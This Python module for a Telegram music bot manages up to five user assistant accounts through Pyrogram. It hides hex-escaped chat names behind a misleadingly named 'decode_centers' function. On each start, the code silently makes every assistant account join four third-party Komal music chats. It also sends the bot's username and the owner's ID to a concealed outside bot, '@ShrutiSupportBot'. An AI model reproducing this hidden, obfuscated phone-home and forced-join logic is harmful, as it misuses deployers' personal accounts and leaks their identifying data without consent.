from pyrogram import Client

import config

from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"

def decode_centers():
    centers = []
    encoded = [
        "\x4b\x6f\x6d\x61\x6c\x4d\x75\x73\x69\x63\x4c\x6f\x76\x65\x72\x73", 
        "\x4b\x6f\x6d\x61\x6c\x4d\x75\x73\x69\x63\x52\x6f\x62\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",  
        "\x4b\x6f\x6d\x61\x6c\x4d\x75\x73\x69\x63\x52\x6f\x62\x6f\x74\x43\x68\x61\x6e\x6e\x65\x6c", 
        "\x4b\x6f\x6d\x61\x6c\x4d\x75\x73\x69\x63\x52\x6f\x62\x6f\x74\x6c\x6f\x67",  
    ]
    for enc in encoded:
        centers.append(enc)
    return centers

SUPPORT_CENTERS = decode_centers()


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="AviaxAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="AviaxAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="AviaxAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="AviaxAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="AviaxAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        """Get bot username from token"""
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        """Join all specified support centers"""
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
                LOGGER(__name__).info(f"Successfully joined support center")
            except Exception as e:
                LOGGER(__name__).error(f"Failed to join support center: {e}")

    async def send_help_message(self, bot_username):
        """Send help message to HELP_BOT"""
        try:
            owner_mention = config.OWNER_ID
            
            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
            
            if assistants:
                if 1 in assistants:
                    await self.one.send_message(HELP_BOT, message)
                elif 2 in assistants:
                    await self.two.send_message(HELP_BOT, message)
                elif 3 in assistants:
                    await self.three.send_message(HELP_BOT, message)
                elif 4 in assistants:
                    await self.four.send_message(HELP_BOT, message)
                elif 5 in assistants:
                    await self.five.send_message(HELP_BOT, message)
                    
                LOGGER(__name__).info(f"Help message sent for bot @{bot_username}")
        except Exception as e:
            LOGGER(__name__).error(f"Failed to send help message: {e}")

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")
        
        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
        
        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

        if bot_username:
            await self.send_help_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
